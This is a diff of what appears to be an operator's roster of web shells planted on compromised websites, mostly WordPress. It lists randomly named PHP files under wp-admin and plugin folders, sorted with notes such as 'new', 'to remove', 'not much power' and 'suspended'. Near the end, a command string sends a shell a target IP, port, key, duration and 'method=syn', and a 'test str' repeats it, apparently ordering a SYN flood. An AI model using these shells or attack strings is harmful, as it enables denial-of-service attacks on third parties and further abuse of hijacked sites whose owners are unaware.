@@ -2,13 +2,25 @@ https://xplorant.in/wp-admin/api.php
 https://myshopping.space/wp-admin/api.php
 https://3-upstesting.site/api.php
 https://gridermarketing.com/wp-admin/api.php
-http://cbclickbank.com/wp-admin/api.php
 https://dixieroseclub.org/wp-admin/api.php
 https://cokato-senior-care.org/wp-admin/api.php
 https://clinicapequenosanjos.com.br/wp-admin/api.php
 http://casinonextyear19.com/wp-admin/api.php
 https://hwvps151469.hostwindsdns.com/wp-admin/api.php
 https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php
+https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php
+
+
+-- to remove
+http://cbclickbank.com/wp-admin/api.php
+
+
+-- new
+https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php
+https://constructionnewshubb.com/wp-content/plugins/kjnzakirfr/api.php
+http://ebikes.wdemo.in/admin/controller/extension/extension/api.php
+https://www.developershopon.com/wp-admin/api.php
+
 
 -- not much power
 http://www.novaworldconsulting.com/wp-content/plugins/wxssojdeya/api.php
@@ -16,5 +28,20 @@ http://www.novaworldconsulting.com/wp-content/plugins/wxssojdeya/api.php
 -- suspended
 https://cascadecheese.com/wp-admin/api.php
 
+-- screen not working with php
+https://hyerdev.com/blog/wp-content/plugins/lsifjczlnt/pdjblacyff.php
+https://aliviomax.com.br/wp-content/plugins/jddfegdgkk/qrduapmrbd.php
+https://telethings.com.br/wp-content/plugins/xmwtwjphby/zibkgurifm.php
+https://motionpro9.com/wp-content/plugins/uxnalmcytb/ajovawkyga.php
+https://mkt.lat/wp/yoiqdmbhnj.php
+https://smyrnaflavors.com/blog/wp-content/plugins/xdbdxcarwn/ifebschmok.php
+https://www.ilovenerdlife.com/wp-content/plugins/tnwxwdutuy/cmzblcsfqd.php
+http://pcgeek365.co.uk/wp-admin/oootfdgkal.php
+https://mdcari.com.br/wp-content/plugins/rcgpmfyytq/heyfgoozbf.php
+https://krotanote.strodaboga.com/rdxuspqyye.php
+https://sebs.com.mx/wp.mail.php
 
 https://auroravlsi.com/wp-admin/api.php?host=23.227.146.106&port=22&key=etherealhehe&time=30&method=syn -- no power
+
+-- test str
+?host=23.227.146.106&port=53&key=etherealhehe&time=30&method=syn
